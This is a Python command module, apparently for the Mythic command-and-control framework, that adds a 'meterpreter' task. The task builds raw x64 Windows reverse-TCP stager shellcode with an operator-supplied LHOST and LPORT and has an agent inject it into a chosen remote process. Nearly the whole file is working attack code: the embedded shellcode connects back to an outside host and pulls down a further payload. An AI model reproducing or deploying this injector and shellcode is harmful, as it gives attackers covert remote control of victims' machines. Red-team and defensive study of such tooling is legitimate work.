from CommandBase import *
import json
from MythicFileRPC import *


class MeterpreterArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number),
            "payload_type": CommandParameter(name="Payload Type", type=ParameterType.ChooseOne, choices=["reverse_tcp"]),
            "lhost": CommandParameter(name="LHOST", type=ParameterType.String),
            "lport": CommandParameter(name="LPORT", type=ParameterType.Number)
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.\n\tUsage: {}".format(MeterpreterCommand.help_cmd))
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.\n\tUsage: {}".format(MeterpreterCommand.help_cmd))
        self.load_args_from_json_string(self.command_line)
        pass


class MeterpreterCommand(CommandBase):
    cmd = "meterpreter"
    needs_admin = False
    help_cmd = "meterpreter (modal popup)"
    description = "Inject a meterpreter reverse stager into a remote process."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@reznok"
    argument_class = MeterpreterArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicFileRPC(task).register_file(build_meterpreter_reverse_tcp_64(task.args.get_arg("lhost"),
                                                                                        task.args.get_arg("lport")))

        # Remove args that are unused by remote agent
        task.args.remove_arg("lhost")
        task.args.remove_arg("lport")

        if resp.status == MythicStatus.Success:
            task.args.add_arg("shellcode", resp.agent_file_id)
        else:
            raise Exception(f"Failed to host sRDI loader stub: {resp.error_message}")

        return task

    async def process_response(self, response: AgentResponse):
        pass


def build_meterpreter_reverse_tcp_64(IP, port):
    hex_ip = bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))
    hex_port = port.to_bytes(2, 'big')

    buf = b""
    buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
    buf += b"\x50\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x56\x48"
    buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
    buf += b"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c"
    buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
    buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66"
    buf += b"\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80"
    buf += b"\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50"
    buf += b"\x44\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x48"
    buf += b"\xff\xc9\x41\x8b\x34\x88\x4d\x31\xc9\x48\x01\xd6\x48"
    buf += b"\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75"
    buf += b"\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
    buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
    buf += b"\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
    buf += b"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
    buf += b"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    buf += b"\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f"
    buf += b"\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0"
    buf += b"\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00"
    # PORT
    buf += hex_port

    # IP
    buf += hex_ip

    buf += b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba"
    buf += b"\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00"
    buf += b"\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41"
    buf += b"\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48"
    buf += b"\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf"
    buf += b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2"
    buf += b"\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0"
    buf += b"\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48"
    buf += b"\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
    buf += b"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
    buf += b"\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"
    buf += b"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31"
    buf += b"\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49"
    buf += b"\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89"
    buf += b"\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d"
    buf += b"\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a"
    buf += b"\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41"
    buf += b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff"
    buf += b"\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4"
    buf += b"\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2"
    buf += b"\x56\xff\xd5"

    return buf
